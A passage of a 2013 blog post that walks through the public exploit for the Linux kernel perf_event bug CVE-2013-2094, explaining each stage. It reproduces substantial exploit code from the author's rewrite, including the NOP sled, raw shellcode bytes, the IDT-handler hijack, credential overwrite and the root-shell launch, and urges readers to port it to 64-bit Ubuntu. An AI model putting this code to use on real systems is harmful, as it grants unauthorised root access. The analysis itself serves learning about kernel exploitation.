<pre class="prettyprint"><span class="pln"> &nbsp;</span><span class="com">/* this instruction and the subsequent mask correspond to lines 71-72 in<br>&nbsp; &nbsp;* the original exploit.<br>&nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; asm </span><span class="kwd">volatile</span><span class="pln"> </span><span class="pun">(</span><span class="str">"sidt %0"</span><span class="pln"> </span><span class="pun">:</span><span class="pln"> </span><span class="str">"=m"</span><span class="pln"> </span><span class="pun">(</span><span class="pln">idt</span><span class="pun">));</span><span class="pln"><br>&nbsp; kbase </span><span class="pun">=</span><span class="pln"> idt</span><span class="pun">.</span><span class="pln">addr </span><span class="pun">&amp;</span><span class="pln"> </span><span class="lit">0xff000000</span><span class="pun">;</span><span class="pln"><br>&nbsp; <br>&nbsp; </span><span class="com">/* allocate KSIZE bytes at address kbase */</span><span class="pln"><br>&nbsp; code </span><span class="pun">=</span><span class="pln"> mmap</span><span class="pun">((</span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*)</span><span class="pln"> kbase</span><span class="pun">,</span><span class="pln"> KSIZE</span><span class="pun">,</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PROT_READ </span><span class="pun">|</span><span class="pln"> PROT_WRITE </span><span class="pun">|</span><span class="pln"> PROT_EXEC</span><span class="pun">,</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MAP_FIXED </span><span class="pun">|</span><span class="pln"> MAP_ANONYMOUS </span><span class="pun">|</span><span class="pln"> MAP_PRIVATE</span><span class="pun">,</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="pun">-</span><span class="lit">1</span><span class="pun">,</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="lit">0</span><span class="pun">);</span></pre>
<p></p>
<p>
This is the memory region to which the kernel will transfer control. I will explain soon how execution will be transferred to this address and why the <code>0xff000000</code> bitmask was applied.
</p>
<h3><u>Preparing the target memory region</u></h3>
<p>
The exploit now prepares the memory region:</p>
<ul>
<li>The memory region is filled with the value <code>0x90</code> which is the opcode for the NOP instruction (See the wikipedia page about the <a href="http://en.wikipedia.org/wiki/NOP_slide" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;en.wikipedia.org&#39;]);">NOP sled</a> for more information).</li>
<li>The malicious code from the function <code>fuck</code> (renamed to <code>fix_idt_and_overwrite_creds</code>) is copied into the memory region after a healthy sized NOP sled.</li>
<li>A small shellcode stub (that we will examine shortly) is prepared and copied into the memory region just before the malicious code.</li>
</ul>
<pre class="prettyprint"><span class="pln"> &nbsp;</span><span class="com">/*<br>&nbsp; &nbsp;* fill the region of memory we just mapped with 0x90 which is the x86<br>&nbsp; &nbsp;* NOP instruction.<br>&nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; memset</span><span class="pun">(</span><span class="pln">code</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x90</span><span class="pun">,</span><span class="pln"> KSIZE</span><span class="pun">);</span><span class="pln"><br><br>&nbsp; </span><span class="com">/* move the code pointer up to the start of the last 1024 bytes of the &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>&nbsp; &nbsp;* mapped region.<br>&nbsp; &nbsp;*<br>&nbsp; &nbsp;* this leaves (32 megabytes - 1024 bytes) of NOP instructions in<br>&nbsp; &nbsp;* memory.<br>&nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; code </span><span class="pun">+=</span><span class="pln"> </span><span class="pun">(</span><span class="pln">KSIZE</span><span class="pun">-</span><span class="lit">1024</span><span class="pun">);</span><span class="pln"><br><br>&nbsp; </span><span class="com">/* copy the code for the function above to the memory region */</span><span class="pln"><br>&nbsp; memcpy</span><span class="pun">(</span><span class="pln">code</span><span class="pun">,</span><span class="pln"> </span><span class="pun">&amp;</span><span class="pln">fix_idt_and_overwrite_creds</span><span class="pun">,</span><span class="pln"> </span><span class="lit">1024</span><span class="pun">);</span><span class="pln"><br><br>&nbsp; </span><span class="com">/* copy our shell code just before the code above */</span><span class="pln"><br>&nbsp; memcpy</span><span class="pun">(</span><span class="pln">code </span><span class="pun">-</span><span class="pln"> shellcode_sz</span><span class="pun">,</span><span class="pln"> shellcode</span><span class="pun">,</span><span class="pln"> shellcode_sz</span><span class="pun">);</span></pre>
<p></p>
<h3><u>A closer look at the malicious code</u></h3>
<p>Before we can examine the rest of the exploit, we'll first need to understand the malicious code that is copied into the memory region.</p>
<p>The malicious code, originally called <code>fuck</code>, but renamed to <code>fix_idt_and_overwrite_creds</code> has a few goals:</p>
<ul>
<li>Restore as much of the overwritten kernel data as possible or at least enough for the kernel to continue (mostly) working.</li>
<li>Find the kernel data structure that lives at the start of the kernel stack. This is a <code>struct thread_info</code>.</li>
<li>Find the pointer in <code>struct thread_info</code> to the current <code>struct task_struct</code>. This should be easy once the <code>struct thread_info</code> is located, as it is the first field in <code>struct thread_info</code>.</li>
<li>Find the <code>struct cred</code> pointer in the current <code>struct task_struct</code>.</li>
<li>Overwrite the various uids and gids as well as the <a href="https://www.kernel.org/pub/linux/libs/security/linux-privs/kernel-2.2/capfaq-0.2.txt" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;www.kernel.org&#39;]);">kernel_cap_t</a> fields.</li>
</ul>
<p>The original exploit code for this is a bit painful to read. In my rewritten exploit I added a lot of comments to the code to help explain how each of these goals is accomplished.</p>
<p><b>Take a look at the code <a href="https://github.com/realtalk/cve-2013-2094/blob/master/rewritten_semtex.c#L56-L201" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;github.com&#39;]);">here</a></b>.
</p>
<h3><u>Cleaning up after itself</u></h3>
<p>One of the first things that <code>fuck</code> (aka <code>fix_idt_and_overwrite_creds</code>) does is fix the upper 32-bits of the IDT handler offset for software interrupt <code>4</code>, by doing this:</p>
<p></p><pre class="prettyprint"><span class="com">/* This marker will eventually be replaced by the address of the upper 32-bits<br>&nbsp;* of the IDT handler address we are overwiting.<br>&nbsp;*<br>&nbsp;* Thus, the write on the following line to -1 will restore the original value<br>&nbsp;* of the IDT entry which we will overwrite <br>&nbsp;*/</span><span class="pln"><br>uint32_t </span><span class="pun">*</span><span class="pln">fixptr </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">void</span><span class="pun">*)</span><span class="pln"> GENERATE_MARKER</span><span class="pun">(</span><span class="lit">1</span><span class="pun">);</span><span class="pln"><br></span><span class="pun">*</span><span class="pln">fixptr </span><span class="pun">=</span><span class="pln"> </span><span class="pun">-</span><span class="lit">1</span><span class="pun">;</span></pre>
<p></p>
<h3><u>Locating the uids and gids</u></h3>
<p>The most interesting part of this malicious code (for me, at least) is how exactly it locates the uids and gids that need to be overwritten.</p>
<p>You'll notice that in the <code>main</code> function of the exploit, the exploit has the following code:</p>
<p></p><pre class="prettyprint"><span class="com">/* get the current userid and groupids */</span><span class="pln"><br>u </span><span class="pun">=</span><span class="pln"> getuid</span><span class="pun">();</span><span class="pln"><br>g </span><span class="pun">=</span><span class="pln"> getgid</span><span class="pun">();</span><span class="pln"><br><br></span><span class="com">/* set all user ids and group ids to be the same, this will help find this<br>&nbsp;* process' credential structure later.<br>&nbsp;*/</span><span class="pln"><br>setresuid</span><span class="pun">(</span><span class="pln">u</span><span class="pun">,</span><span class="pln"> u</span><span class="pun">,</span><span class="pln"> u</span><span class="pun">);</span><span class="pln"><br>setresgid</span><span class="pun">(</span><span class="pln">g</span><span class="pun">,</span><span class="pln"> g</span><span class="pun">,</span><span class="pln"> g</span><span class="pun">);</span></pre>
<p></p>
<p>This code ensures that all the uids and gids are set to the current uid and gid. This is done so that the malicious code that executes later can search memory for a sequence of uids and gids and "know" that it has found the right place to begin overwriting data.</p>
<p>Another interesting thing to note about the malicious code is that it gets <i>modified</i> at runtime after it has been copied to the memory region described above.</p>
<h3><u>Rewriting parts of the malicious code at runtime</u></h3>
<p>The malicious code needs to be overwritten at runtime after it has been copied to the memory region to which control will be transfered for two main reasons:</p>
<ol>
<li>At compile time the process' uid and gid may not be known.</li>
<li>At compile time the address of any overwritten kernel state my not be known. As we will soon see, this overwritten state is part of the <code>IDT</code> handler offset for a particular software interrupt.</li>
</ol>
<p>In order to accomplish these goals, you will notice that the <code>fuck</code> function (or <code>fix_idt_and_overwrite_creds</code>) has a series of "markers" in place:</p>
<p></p><pre class="prettyprint"><span class="pln"> &nbsp;</span><span class="com">/* create a few markers which will be filled in with the<br>&nbsp; &nbsp;* ((group id &lt;&lt; 32) | user id) later by the exploit.<br>&nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; uint64_t uids</span><span class="pun">[</span><span class="lit">4</span><span class="pun">]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="pun">{</span><span class="pln"> &nbsp;GENERATE_MARKER</span><span class="pun">(</span><span class="lit">2</span><span class="pun">),</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; GENERATE_MARKER</span><span class="pun">(</span><span class="lit">3</span><span class="pun">),</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; GENERATE_MARKER</span><span class="pun">(</span><span class="lit">4</span><span class="pun">),</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; GENERATE_MARKER</span><span class="pun">(</span><span class="lit">5</span><span class="pun">)</span><span class="pln"><br>&nbsp; </span><span class="pun">};</span><span class="pln"><br>&nbsp; <br>&nbsp; </span><span class="com">/* ... */</span><span class="pln"><br><br>&nbsp; uint32_t </span><span class="pun">*</span><span class="pln">fixptr </span><span class="pun">=</span><span class="pln"> </span><span class="pun">(</span><span class="kwd">void</span><span class="pun">*)</span><span class="pln"> GENERATE_MARKER</span><span class="pun">(</span><span class="lit">1</span><span class="pun">);</span></pre>
<p></p>
<p>These values are simply unique enough bit patterns that can be located later and overwritten.</p>
<p>The <code>main</code> function of the exploit takes care of that by doing this:</p>
<p></p><pre class="prettyprint"><span class="kwd">for</span><span class="pln"> </span><span class="pun">(</span><span class="pln">j </span><span class="pun">=</span><span class="pln"> </span><span class="lit">5</span><span class="pun">;</span><span class="pln"> j </span><span class="pun">&gt;</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> j</span><span class="pun">--)</span><span class="pln"> </span><span class="pun">{</span><span class="pln"><br>&nbsp; </span><span class="com">/* generate marker values */</span><span class="pln"><br>&nbsp; needle </span><span class="pun">=</span><span class="pln"> GENERATE_MARKER</span><span class="pun">(</span><span class="pln">j</span><span class="pun">);</span><span class="pln"><br>&nbsp; <br>&nbsp; </span><span class="com">/* find marker values in the malicious code copied to our memory<br>&nbsp; &nbsp;* region<br>&nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; p </span><span class="pun">=</span><span class="pln"> memmem</span><span class="pun">(</span><span class="pln">code</span><span class="pun">,</span><span class="pln"> </span><span class="lit">1024</span><span class="pun">,</span><span class="pln"> </span><span class="pun">&amp;</span><span class="pln">needle</span><span class="pun">,</span><span class="pln"> </span><span class="lit">8</span><span class="pun">);</span><span class="pln"><br>&nbsp; </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(!</span><span class="pln">p</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; fprintf</span><span class="pun">(</span><span class="pln">stderr</span><span class="pun">,</span><span class="pln"> </span><span class="str">"couldn't find the marker values (this is"</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="str">"bad)\n"</span><span class="pun">);</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; </span><span class="kwd">break</span><span class="pun">;</span><span class="pln"><br>&nbsp; </span><span class="pun">}</span><span class="pln"><br>&nbsp; <br>&nbsp; </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">j </span><span class="pun">&gt;</span><span class="pln"> </span><span class="lit">1</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln"><br>&nbsp; &nbsp; </span><span class="com">/* marker values [2 - 5] will be replaced with the uid/gid of this process */</span><span class="pln"><br>&nbsp; &nbsp; </span><span class="pun">*</span><span class="pln">p </span><span class="pun">=</span><span class="pln"> </span><span class="pun">((</span><span class="pln">g </span><span class="pun">&lt;&lt;</span><span class="pln"> </span><span class="lit">32</span><span class="pun">)</span><span class="pln"> </span><span class="pun">|</span><span class="pln"> u</span><span class="pun">);</span><span class="pln"><br>&nbsp; </span><span class="pun">}</span><span class="pln"> </span><span class="kwd">else</span><span class="pln"> </span><span class="pun">{</span><span class="pln"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; </span><span class="com">/* marker value 1 will be replaced with the offset of the IDT handler we will<br>&nbsp; &nbsp; &nbsp;* highjack. this address will be used to restore the overwritten state later.<br>&nbsp; &nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; &nbsp; </span><span class="pun">*</span><span class="pln">p </span><span class="pun">=</span><span class="pln"> idt</span><span class="pun">.</span><span class="pln">addr </span><span class="pun">+</span><span class="pln"> </span><span class="lit">0x48</span><span class="pun">;</span><span class="pln"><br>&nbsp; </span><span class="pun">}</span><span class="pln"><br></span><span class="pun">}</span></pre>
<p></p>
<h3><u>Incrementing the address of an IDT handler</u></h3>
<p>Now, everything is in place. It is time for the exploit to connect all the pieces together before triggering the malicious code and executing a root shell.</p>
<p>The last piece of the puzzle was pretty interesting for me as this was my first time seeing this attack vector, but after I understood what was happening and did some googling I located a <a href="http://www.phrack.org/issues.html?issue=64&amp;id=6#article" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;www.phrack.org&#39;]);">phrack</a> article from 2007 that explains this attack vector.</p>
<p>This exploit works by incrementing the upper 32-bits of a 64-bit IDT entry's handler offset (check the screenshot from the Intel manual above). The IDT entry for the overflow exception was chosen, software interrupt <code>4</code>, because it is not particularly important and can be temporarily "borrowed" by this exploit.</p>
<p>Since the overflow exception's handler is located in kernel memory, the upper 32-bits of the 64-bit handler offset are <code>0xffffffff</code>. Incrementing <code>0xffffffff</code> causes an overflow to <code>0x00000000</code> and thus the 64-bit IDT handler's offset goes from <code>0xffffffff[lower 32bits]</code> to <code>0x00000000[lower 32bits]</code>.</p>
<p>Or in other words, changing the top 32-bits of the address to <code>0</code> changes the address from a location in kernel memory to a location that can be mapped with <code>mmap</code> and <code>MAP_FIXED</code>.</p>
<p>This is why the IDT's base address was masked earlier in the exploit like this:</p>
<p></p><pre class="prettyprint"><span class="com">/*<br>&nbsp;* the "sidt" instruction retrieves the base Interrupt Descriptor Table <br>&nbsp;*<br>&nbsp;* this instruction and the subsequent mask correspond to lines 71-72 in<br>&nbsp;* the original exploit.<br>&nbsp;*/</span><span class="pln"><br><br>asm </span><span class="kwd">volatile</span><span class="pln"> </span><span class="pun">(</span><span class="str">"sidt %0"</span><span class="pln"> </span><span class="pun">:</span><span class="pln"> </span><span class="str">"=m"</span><span class="pln"> </span><span class="pun">(</span><span class="pln">idt</span><span class="pun">));</span><span class="pln"><br>kbase </span><span class="pun">=</span><span class="pln"> idt</span><span class="pun">.</span><span class="pln">addr </span><span class="pun">&amp;</span><span class="pln"> </span><span class="lit">0xff000000</span><span class="pun">;</span></pre>
<p></p>
<p>The actual increment happens when the following code executes:</p>
<p></p><pre class="prettyprint"><span class="pln">break_perf_event_open</span><span class="pun">(-</span><span class="pln">i </span><span class="pun">+</span><span class="pln"> </span><span class="pun">(((</span><span class="pln">idt</span><span class="pun">.</span><span class="pln">addr</span><span class="pun">&amp;</span><span class="lit">0xffffffff</span><span class="pun">)-</span><span class="lit">0x80000000</span><span class="pun">)/</span><span class="lit">4</span><span class="pun">)</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> </span><span class="lit">16</span><span class="pun">);</span></pre>
<p></p>
<p>This code is just doing some tricky arithmetic to calculate the value that must be passed to the buggy kernel increment path in order to increment the upper 32-bits of the 64-bit IDT handler for software interrupt <code>4</code></p>
<h3><u>Triggering the exploit</u></h3>
<p>Now that everything is hooked in, triggering the exploit is simple:</p>
<p></p><pre class="prettyprint"><span class="com">/*<br>&nbsp;* trigger the highjacked interrupt handler<br>&nbsp;*/</span><span class="pln"><br>asm </span><span class="kwd">volatile</span><span class="pun">(</span><span class="str">"int $0x4"</span><span class="pun">);</span></pre>
<p></p>
<p>This raises the interrupt causing the CPU to transfer control to the (modified) IDT handler address which is actually just the memory region we created above and copied <code>NOP</code>s, shellcode, and malicious C code into.</p>
<p>After the <code>NOP</code>s execute, the shellcode executes:</p>
<pre class="prettyprint"><span class="kwd">static</span><span class="pln"> </span><span class="kwd">char</span><span class="pln"> shellcode</span><span class="pun">[]</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="str">"\x0f\x01\xf8"</span><span class="pln"> &nbsp; &nbsp; &nbsp; </span><span class="com">/* &nbsp;swapgs &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="str">"\xe8\x05\x0\x0\x0"</span><span class="pln"> &nbsp;</span><span class="com">/* &nbsp;callq &nbsp;</span><shellcode +="" 0xd=""><span class="com"> &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * &nbsp;(this callq transfers<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * &nbsp;exeuction to after this piece<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * &nbsp;of shell code where the<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * &nbsp;fix_idt_and_overwrite_creds<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; * &nbsp;function will live<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="str">"\x0f\x01\xf8"</span><span class="pln"> &nbsp; &nbsp; &nbsp; </span><span class="com">/* &nbsp;swapgs &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="str">"\x48\xcf"</span><span class="pun">;</span><span class="pln"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="com">/* &nbsp;iretq$ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span><span class="pln"><br></span></shellcode></pre>
<p></p>
<p>This shell code:
</p>
<ul>
<li>Swaps in a stored value for the <code>GS</code> register, which the kernel needs for accessing internal data.</li>
<li>Transfers control to our malicious C code (<code>fuck</code>, aka <code>fix_idt_and_overwrite_creds</code>).</li>
<li>After the malicious C code returns, the shellcode continues by swapping the <code>GS</code> register back out.</li>
<li>And finally, it returns to userland with <code>iret</code>.</li>
</ul>
<h3><u>Dat root shell</u></h3>
<p>After the above code executes, the malicious code has been triggered, the uid and gid of the process as well as the capability set have been overwritten. The process can now change its uid to root and execute a shell as root:</p>
<p></p><pre class="prettyprint"><span class="com">/*<br>&nbsp;* at this point we should be able to set the userid of this process to<br>&nbsp;* 0.<br>&nbsp;*/</span><span class="pln"><br></span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">setuid</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">!=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln"><br>&nbsp; perror</span><span class="pun">(</span><span class="str">"setuid"</span><span class="pun">);</span><span class="pln"><br>&nbsp; exit</span><span class="pun">(</span><span class="pln">EXIT_FAILURE</span><span class="pun">);</span><span class="pln"><br></span><span class="pun">}</span><span class="pln"><br><br></span><span class="com">/*<br>&nbsp;* launch bash as uid 0<br>&nbsp;*/</span><span class="pln"><br></span><span class="kwd">return</span><span class="pln"> execl</span><span class="pun">(</span><span class="str">"/bin/bash"</span><span class="pun">,</span><span class="pln"> </span><span class="str">"-sh"</span><span class="pun">,</span><span class="pln"> NULL</span><span class="pun">);</span></pre>
<p></p>
<p>Easily one of the most insane exploits I've seen, but that isn't saying much since I don't look at exploits all that often.</p>
<h2>Exercise for the reader</h2>
<p>Now that you know how this exploit works, go make it work on a 64-bit Ubuntu. No, seriously, do it.</p>
<h2>Conclusion</h2>
<ul>
<li>Dealing with integers in C code is tricky. Be careful and get people to review your code.</li>
<li>Hijacking IDT entries to scan kernel memory to find and overwrite kernel data structures to elevate privileges of a user process so it can then execute a bash shell as root is pretty nuts.</li>
<li><code>MAP_FIXED</code> is actually much more useful than I had previously imagined.</li>
<li>Hijacking IDT entries to scan kernel memory to find and overwrite kernel data structures to elevate privileges of a user process so it can then execute a bash shell as root is pretty nuts.</li>
<li>Reading exploit code is fun and interesting. You should do it more often than you probably do right now.</li>
<li>I'm tired from writing this much.</li>
</ul>
<p>If you enjoyed this article, <a rel="alternate" type="application/rss+xml" href="http://feeds.feedburner.com/TimeToBleed" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;feeds.feedburner.com&#39;]);">subscribe (via RSS or e-mail)</a> and <a href="http://twitter.com/joedamato" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;twitter.com&#39;]);">follow me on twitter.</a></p>
<h2>References</h2>
<ol class="footnotes"><li id="footnote_0_2470" class="footnote"><a href="http://www.intel.com/Assets/PDF/manual/253668.pdf" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;www.intel.com&#39;]);">Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 3A: System Programming Guide, Part 1, 5.1: Interrupt and Exception Overview</a> [<a href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/#identifier_0_2470" class="footnote-link footnote-back-link">↩</a>]</li><li id="footnote_1_2470" class="footnote"> /usr/include/linux/perf_event.h line 198  [<a href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/#identifier_1_2470" class="footnote-link footnote-back-link">↩</a>]</li></ol></div>


<div class="meta group">
<div class="signature">
    <p>Written by Joe Damato <span class="edit"></span></p>
    <p>May 20th, 2013 at 10:29 pm</p>
</div>	
<div class="tags">
    <p>Posted in <a href="http://timetobleed.com/category/bugfix/" title="View all posts in bugfix" rel="category tag">bugfix</a>,<a href="http://timetobleed.com/category/linux/" title="View all posts in linux" rel="category tag">linux</a>,<a href="http://timetobleed.com/category/security/" title="View all posts in security" rel="category tag">security</a>,<a href="http://timetobleed.com/category/systems/" title="View all posts in systems" rel="category tag">systems</a></p>
    </div>
</div>

<div class="navigation group">
    <div class="alignleft">« <a href="http://timetobleed.com/digging-out-the-craziest-bug-you-never-heard-about-from-2008-a-linux-threading-regression/" rel="prev">Digging out the craziest bug you never heard about from 2008: a linux threading regression</a></div>
    <div class="alignright"></div>
</div>



</div> 

<div id="sidebar">
			<div class="textwidget"><p><a href="http://feeds.feedburner.com/TimeToBleed" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-widget&#39;,&#39;feeds.feedburner.com&#39;]);"><img src="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/TimeToBleed" height="26" width="88" style="border:0" alt=""></a></p></div>
					<div class="textwidget"><br><p><a href="http://feeds.feedburner.com/TimeToBleed" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-widget&#39;,&#39;feeds.feedburner.com&#39;]);" rel="alternate" type="application/rss+xml"><img src="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/feed-icon32x32.png" alt="" style="vertical-align:middle;border:0"></a>&nbsp;<a href="http://feeds.feedburner.com/TimeToBleed" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-widget&#39;,&#39;feeds.feedburner.com&#39;]);" rel="alternate" type="application/rss+xml">Subscribe via RSS</a></p><br>
<p><a href="http://www.feedburner.com/fb/a/emailverifySubmit?feedId=2494355&amp;loc=en_US" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-widget&#39;,&#39;www.feedburner.com&#39;]);"><img src="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/email-icon.jpg" alt="" style="vertical-align:middle;border:0"></a>&nbsp;<a href="http://www.feedburner.com/fb/a/emailverifySubmit?feedId=2494355&amp;loc=en_US" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-widget&#39;,&#39;www.feedburner.com&#39;]);">Subscribe via Email</a></p><br></div>
					<div class="textwidget"><br><h2>twitter: <a href="http://twitter.com/joedamato" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-widget&#39;,&#39;twitter.com&#39;]);">@joedamato</a></h2><br><br><img src="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/email-badge.png"><br><br></div>
		<h3>Archives</h3>		<select name="archive-dropdown" onchange="document.location.href=this.options[this.selectedIndex].value;"> <option value="">Select Month</option> 	<option value="http://timetobleed.com/2013/05/"> May 2013 &nbsp;(2)</option>
	<option value="http://timetobleed.com/2013/04/"> April 2013 &nbsp;(2)</option>
	<option value="http://timetobleed.com/2012/11/"> November 2012 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2012/10/"> October 2012 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2012/08/"> August 2012 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2012/07/"> July 2012 &nbsp;(2)</option>
	<option value="http://timetobleed.com/2011/07/"> July 2011 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2010/11/"> November 2010 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2010/09/"> September 2010 &nbsp;(2)</option>
	<option value="http://timetobleed.com/2010/08/"> August 2010 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2010/07/"> July 2010 &nbsp;(1)</option>
